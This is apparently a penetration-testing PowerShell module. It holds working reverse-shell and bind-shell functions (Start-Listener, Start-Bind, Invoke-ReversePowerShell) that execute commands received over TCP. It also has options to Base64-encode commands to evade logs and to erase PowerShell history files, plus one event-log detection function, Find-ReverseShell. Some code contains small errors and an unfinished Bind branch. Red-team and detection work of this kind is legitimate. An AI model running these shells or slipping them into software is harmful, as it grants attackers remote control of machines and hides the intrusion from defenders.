<#
.SYNOPSIS
This cmdlet is for starting a listener that a reverse shell connection can attach too.


.DESCRIPTION
This cmdlet opens a listner port to connect to from a target machine.


.PARAMETER Port
This parameter is for defining the listening port to connect too. The cmdlet binds connections to the port that you specify. The default value for this parameter is 1337.


.EXAMPLE
Start-Listener
# This examples connects to a listener on port 1337.

.EXAMPLE
Start-Listener -Port 1234
# This examples connects to a listener on port 1234.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.INPUTS
None


.OUTPUTS
None


.LINK
https://osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://writeups.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286
#>
Function Start-Listener {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337
        ) # End param


    $PortString = $Port.ToString()
    Write-Verbose "Checking for availability of $PortString"

    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpListeners()
    If ($Connections.Port -Contains "$Port") {

        Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."

    }  # End If

    Write-Verbose "Defining listener object"
    $Socket = New-Object -TypeName System.Net.Sockets.TcpListener('0.0.0.0', $Port)

    If ($Null -eq $Socket) {

        Exit

    }  # End If

    Write-Verbose "Starting listener on port $PortString and creating job to allow closing the connection"
    Write-Output "[i] If you receive an error message here stating 'An attempt was made to access a socket in a way forbidden by its access permissions' you need to restart the hns service. `n`t[i] Restart-Service -Name hns -Force"
    If ($PSCmdlet.ShouldProcess($Socket.Start())) {

        Try {

            Write-Output ("[*] Listening on [0.0.0.0] (port $PortString)")
            While ($True) {

                Write-Verbose "Waiting for connection..."
                If ($Socket.Pending()) {

                    $Client = $Socket.AcceptTcpClient()
                    Break

                }  # End If

                Start-Sleep -Seconds 2

            }  # End While

        } Finally {

            If (!($Client.Connected)) {

                Write-Verbose "Terminating connection"
                $Socket.Stop()
                $Client.Close()
                $Stream.Dispose()
                Write-Verbose "Connection closed"

            }  # End If

        }  # End Try Finally

        Write-Output "[*] Connection Established"

        Write-Verbose "Creating byte stream"
        $Stream = $Client.GetStream()
        $Writer = New-Object -TypeName System.IO.StreamWriter($Stream)
        $Buffer = New-Object -TypeName System.Byte[] 2048
        $Encoding = New-Object -TypeName System.Text.AsciiEncoding

        Write-Verbose "Begin command execution loop"
        Do {

            $Command = Read-Host

            $Writer.WriteLine($Command)
            $Writer.Flush();

            If ($Command -eq "exit") {

                Write-Verbose "Exiting"
                Break

            }  # End If

            $Read = $Null
            While ($Stream.DataAvailable -or $Null -eq $Read) {

                $Read = $Stream.Read($Buffer, 0, 2048)
                $Out = $Encoding.GetString($Buffer, 0, $Read)

                Write-Output $Out

            } # End While

        } While ($Client.Connected -eq $True) # End Do While Loop

        Write-Verbose "Terminating connection"
        $Socket.Stop()
        $Client.Close()
        $Stream.Dispose()
        Write-Verbose "Connection closed"

    } Else {

        Write-Output "[*] Start-Listener would have started a listener on port $PortString"

    }  # End If Else

} # End Function Start-Listener


<#
.SYNOPSIS
This cmdlet is for binding the PowerShell application to a listening port.


.DESCRIPTION
This cmdlet opens a Bind Shell that attaches to PowerShell and listens on a port that you define.


.PARAMETER Port
This parameter is for defining the listening port that PowerShell should attach too This cmdlet binds powershell to the port you speficy. The default value for this parameter is 1337.


.EXAMPLE
Start-Bind
# This examples connects powershell.exe to a listener on port 1337.

.EXAMPLE
Start-Bind -Port 1234
# This examples connects powershell.exe to a listener on port 1234.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.INPUTS
None


.OUTPUTS
None


.LINK
https://osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://writeups.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286
#>
Function Start-Bind {
    [CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'Low')]
        param(
            [Parameter(
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$False,
                HelpMessage='Enter a port to listen on. Valid ports are between 1 and 65535. Example: 1234')] # End Parameter
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337
        )  # End param


        $PortString = $Port.ToString()

        Write-Verbose "Checking for availability of $PortString"

        $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
        $Connections = $TCPProperties.GetActiveTcpListeners()
        If ($Connections.Port -Contains "$Port") {

            Throw "[!] Port $Port is alreday in use by another process(es). Select another port to use or stop the occupying processes."

        }  # End If

        Write-Verbose "Creating listener on port $PortString"
        $Listener = New-Object -TypeName System.Net.Sockets.TcpListener]('0.0.0.0', $Port)

        If ($PSCmdlet.ShouldProcess($Listener.Start())) {

            Write-Output "[*] PowerShell.exe is bound to port $PortString"

            Try {

                While ($True) {

                    Write-Verbose "Begin loop allowing Ctrl+C to stop the listener"
                    If ($Listener.Pending()) {

                        $Client = $Listener.AcceptTcpClient()

                        Break

                    }  # End If

                    Start-Sleep -Seconds 2

                }  # End While

            } Finally {

                Write-Output "[*] Press Ctrl + C a couple of times in order to reuse the port you selected as a listener again"
                If ($Listener.Pending()) {

                    Write-Output "[*] Closing open port"
                    $Client.Close()
                    $Listener.Stop()

                }  # End If

            }  # End Try Finally

            Write-Output "[*] Connection Established"
            $Stream = $Client.GetStream()

            Write-Verbose "Streaming bytes to PowerShell connection"
            [Byte[]]$Bytes = 0..65535 | ForEach-Object -Process { 0 }
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Logged into PowerShell as $env:USERNAME on $env:COMPUTERNAME `n`n")

            $Stream.Write($SendBytes,0,$SendBytes.Length)
            $SendBytes = ([Text.Encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
            $Stream.Write($SendBytes,0,$SendBytes.Length)

            Write-Verbose "Begin command execution cycle"
            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {

                $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                $Data = $EncodedText.GetString($Bytes, 0, $i)
                Try {

                    $SendBack = (Invoke-Expression -Command $Data 2>&1 | Out-String)

                } Catch {

                    Write-Output "Failure occured attempting to execute the command on target."
                    $Error[0] | Out-String

                }  # End Try Catch

                Write-Verbose "Initial data send failed. Attempting a second time"
                $SendBack2  = $SendBack + 'PS ' + (Get-Location | Select-Object -ExpandProperty 'Path') + '> '
                $x = ($Error[0] | Out-String)
                $Error.Clear()
                $SendBack2 = $SendBack2 + $x

                $SendByte = ([Text.Encoding]::ASCII).GetBytes($SendBack2)
                $Stream.Write($SendByte, 0, $SendByte.Length)
                $Stream.Flush()

            }  # End While

            Write-Verbose "Terminating connection"
            $Client.Close()
            $Listener.Stop()
            Write-Verbose "Connection closed"

        } Else {

            Write-Output "[*] Start-Bind would have bound PowerShell to a listener on port $PortString"

        }  # End If Else

}  # End Function Start-Bind


<#
.SYNOPSIS
This cmdlet is for connecting PowerShell to a listening port on a target machine.


.DESCRIPTION
Establishes a connection to a listening port on a remote machine effectively completing a reverse or bind shell.


.PARAMETER IpAddress
This parameter is for defining the IPv4 address to connect too on a remote machine. This cmdlet looks for a connection at this IP address on the remote host.

.PARAMETER Port
This parameter is for defining the listening port to attach to on a remote machine This cmdlet looks for a connection on a remote host using the port that you speficy here.

.PARAMETER Reverse
This switch parameter sets the Reverse parameter set value to be used. This is the default parameter set value and is not required.

.PARAMETER Bind
This switch paramter sets the Bind parameter set values to be used

.PARAMETER Obfuscate
This switch parameter is used to execute PowerShell commands using Base64 in an attempt to obfuscate logs.

.PARAMETER ClearHistory
This switch parameter is used to attempt clearing the PowerShell command history upon exiting a session.


.EXAMPLE
Invoke-ReversePowerShell -IpAddress 192.168.2.1 -Port 1234 -ClearHistory
# This command example connects to port 1234 on remote machine 192.168.2.1 and clear the commands executed history afterwards.

.EXAMPLE
Invoke-ReversePowerShell -Reverse -IpAddress 192.168.2.1 -Port 1337 -Obfuscate
# This command example connects to port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64.

.EXAMPLE
Invoke-ReversePowerShell -Bind -IpAddress 192.168.2.1 -Port 1337 -Obfuscate -ClearHistory
# This command example connects to bind port 1337 on remote machine 192.168.2.1. Any commands executed are obfuscated using Base64. The powershell command history is then attempted to be erased.


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://writeups.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None

#>
Function Invoke-ReversePowerShell {
    [CmdletBinding(DefaultParameterSetName="Reverse")]
        param(
            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter the IP Address of the remote machine. Example: 10.10.14.21")] # End Parameter
            [ValidateNotNullorEmpty()]
            [IPAddress]$IpAddress,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False,
                Position=1,
                ValueFromPipeline=$False,
                HelpMessage="Enter the port number the remote machine is listening on. Example: 1234")] # End Parameter
            [ValidateNotNullorEmpty()]
            [ValidateRange(1,65535)]
            [Int32]$Port = 1337,

            [Parameter(
                ParameterSetName="Reverse")]  # End Parameter
            [Switch]$Reverse,

            [Parameter(
                ParameterSetName="Bind")]  # End Parameter
            [Switch]$Bind,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False)]  # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$Obfuscate,

            [Parameter(
                ParameterSetName="Reverse",
                Mandatory=$False)]  # End Parameter
            [Parameter(
                ParameterSetName="Bind",
                Mandatory=$False)]  # End Parameter
            [Alias("C","Cls","Ch","Clear")]
            [Switch][Bool]$ClearHistory
        ) # End param


    Write-Verbose "Creating a fun infinite loop. - The Shadow King (Amahl Farouk)"
    $GodsMakeRules = "They dont follow them"

    While ($GodsMakeRules -eq 'They dont follow them') {

        Write-Verbose "Default error action is being defined as Continue"
        $ErrorActionPreference = 'Continue'

        Try {

            Write-Output "[*] Connection attempted. Check your listener."

            Switch ($PSCmdlet.ParameterSetName) {

            'Reverse' {

                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
                $Stream = $Client.GetStream()

                [Byte[]]$Bytes = 0..255 | ForEach-Object -Process {0}
                $SendBytes = ([Text.Encoding]::ASCII).GetBytes("Welcome $env:USERNAME, you are now connected to $env:COMPUTERNAME "+"`n`n" + "PS " + (Get-Location).Path + "> ")
                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()

                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {

                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)

                    If ($Command.StartsWith("kill-link")) {

                        If ($ClearHistory.IsPresent) {

                            Write-Output "[*] Attempting to clear command history"

                            $CmdHistoryFiles = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt","$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

                            Clear-History
                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue

Set-PSReadlineOption –HistorySaveStyle SaveNothing

                        }  # End If

                        Write-Verbose "Closing client connection"
                        $Client.Close()
                        Write-Verbose "Client connection closed"
                        Exit

                    } # End If
                    
                    Try {

                        # Executes commands
                        If ($Obfuscate.IsPresent) {

                            Write-Verbose "Obfuscating command"

                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command")))
                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
                            $ExecuteCmdAgain = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                        } Else {

                            $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
                            $ExecuteCmdAgain  = $ExecuteCmd + "PS " + (Get-Location).Path + "> "

                        }  # End If Else

                    } Catch {

                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
                        $ExecuteCmdAgain  =  "ERROR: " + $Error[0].ToString() + "`n`n" + "PS " + (Get-Location).Path + "> "

                    } # End Try Catch

                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                    $Stream.Flush()

                } # End While
                
                $Client.Close()

            }  # End Reverse Switch

            'Bind' {

                Write-Warning "Sorry this is not there yet. I am still figuring this part out"
                $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
                $Stream = $Client.GetStream()

                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0) {

                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
                    $Stream.Flush()

                } # End While

                $Client.Close()

                }  # End Bind Switch

            }  # End Switch

        } Catch {

            Write-Output "There was a connection error. Retrying occurs every 30 seconds"

            Write-Verbose "Client closing..."
            $Client.Close()
            Write-Verbose "Client connection closed"

            Write-Verbose "Begining countdown timer to reestablish failed connection"
            [Int]$Timer = 30
            $Length = $Timer / 100

            For ($Timer; $Timer -gt 0; $Timer--) {

                $Text = "0:" + ($Timer % 60) + " seconds left"
                Write-Progress -Activity "Attempting to re-establish connection in: " -Status $Text -PercentComplete ($Timer / $Length)
                Start-Sleep -Seconds 1

            }  # End For

        } # End Try Catch

    } # End While
    
    $Client.Close()
    
    If ($Listener) {

        $Listener.Stop()

    }  # End If

} # End Function Invoke-ReversePowerShell


<#
.SYNOPSIS
This cmdlet can be used to discover reverse shell connections from the past 24 hours. It will ignore connections from the user Paessler as PRTG uses a similar method for creating a TCP socket listener. This will not identify powercat.ps1 reverse shell connections as those are created using a different method.


.DESCRIPTION
Search the Windows Event Viewer for event id 4656 where a tcp listener was created and connected too. If that returns 0 results event ID 5154 is then returned. The appropriate logging will need to be enabled in the event viewer.


.PARAMETER ComputerName
Define a remote device you want to search the event logs of. WinRM is attempted first. If that fails RPC is attempted

.PARAMETER FilePath
Specifies a path to one locations. Wildcards are not permitted.

.PARAMETER UseSSL
Specifies to attempt using WinRM over HTTPS when grabbing event logs from a remote $ComputerName. Note that if WinRM connection fails it will next attempt an RPC connection


.EXAMPLE
Find-ReverseShell
# This example searches for connections from a remote host.

.EXAMPLE
Find-ReverseShell -ComputerName Desktop01 -FilePath C:\Temp\log.evt
# This example searches the localhost for evidence of reverse shell connections built on connections to a tcp socket. It also saves the log file to C:\Users\<username>\AppData\Local\ReverseShell_Logs_2020.01.20.evt


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.INPUTS
None


.OUTPUTS
System.Diagnostics.Eventing.Reader.EventLogntLogRecord
Find-ReverseShell returns System.Diagnostics.Eventing.Reader.EventLogRecord objects.


.LINK
https://osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://writeups.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286

#>
Function Find-ReverseShell {
    [CmdletBinding(DefaultParameterSetName="Local")]
        param(
            [Parameter(
                ParameterSetName="Remote",
                Mandatory=$True,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter a hostname, FQDN, or an IPv4 address")]
            [Parameter(
                ParameterSetName="Local",
                Mandatory=$False,
                Position=0,
                ValueFromPipeline=$True,
                ValueFromPipelineByPropertyName=$True,
                HelpMessage="Enter a hostname, FQDN, or an IPv4 address and follow multiple values using a comma.")]
            [Alias("cn","Computer")]
            [String[]]$ComputerName,

            [Parameter(
                ParameterSetName="Remote",
                Mandatory=$False,
                Position=1,
                HelpMessage="Enter the full path name to a .xml file. Example: C:\Temp\results.xml")]
            [Parameter(
                ParameterSetName="Local",
                Mandatory=$False,
                Position=1,
                HelpMessage="Enter the full path name to a .xml file. Example: C:\Temp\results.xml")]
            [Alias("Path")]
            [ValidateScript( {If ((!(Test-Path -Path $FilePath)) -and ($FilePath -like "*.xml")) {New-Item -Type Directory -Path $FilePath}} )]
            [String]$FilePath,

            [Parameter(
                ParameterSetName="Remote",
                Mandatory=$False)]  # End Parameter
            [Switch][Bool]$UseSSL

        ) # End param


    If ($ComputerName) {

        $SSL = $False
        If ($UseSSL.IsPresent) {

            $SSL = $True

        }  # End If

        Write-Output "[*] Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object, excluding ports opened by the paessler account"
        Try {

            $TcpListenerCheck = Invoke-Command -HideComputerName $ComputerName -UseSSL:$SSL -ScriptBlock {
            
                Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorAction SilentlyContinue
                If ($Null -eq $TcpListenerCheck) {
            
                    $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
                    $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }

                }  # End If

            }  # End Invoke-Command

        } Catch {

            $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorAction SilentlyContinue
            If ($Null -eq $TcpListenerCheck) {
            
                $TcpListenerCheck = Get-WinEvent -ComputerName $ComputerName -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
                $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }

            }  # End If

        }  # End Try Catch

    } Else {

        Write-Output "[*] Checking for Reverse Shells that connect to a System.Net.Sockets.TcpListener object, excluding ports opened by the paessler account"
        $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=4656 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SubjectUserName']!='paessler'] and EventData[Data[@Name='ObjectServer']='WS-Management Listener']]" -ErrorAction SilentlyContinue
        If ($Null -eq $TcpListenerCheck) {
        
            $TcpListenerCheck = Get-WinEvent -LogName 'Security' -FilterXPath "*[System[EventID=5154 and TimeCreated[timediff(@SystemTime) <= 86400000]] and EventData[Data[@Name='SourceAddress']!='127.0.0.1'] and EventData[Data[@Name='FilterRTID']=0] and EventData[Data[@Name='SourcePort']!=139]]" -ErrorVariable $CmdError
            $TcpListenerCheck = $TcpListenerCheck | Where-Object -FilterScript { $_.Properties.Value.Get(1) -like "*powershell*" -or  $_.Properties.Value.Get(1) -like "*cmd*" }

        }  # End If

    }  # End If Else

    If ($Null -ne $TcpListenerCheck) {

        Write-Verbose "Shell Event was found"
        Return $TcpListenerCheck

        If ($FilePath) {

            Write-Verbose "Building XML file and saving too $FilePath"
            $TcpListenerCheck.ToXml() | Out-File -FilePath "$FilePath"

            Write-Warning "A reverse shell has been discovered to exist from the last 24 hours.`n`n$FilePath contains the related events in XML format."

        }  # End If

    } Else {

        Write-Output "[*] No Reverse shells have been discovered to exist in the last 24 hours."

    }  # End If Else

} # End Function Find-ReverseShell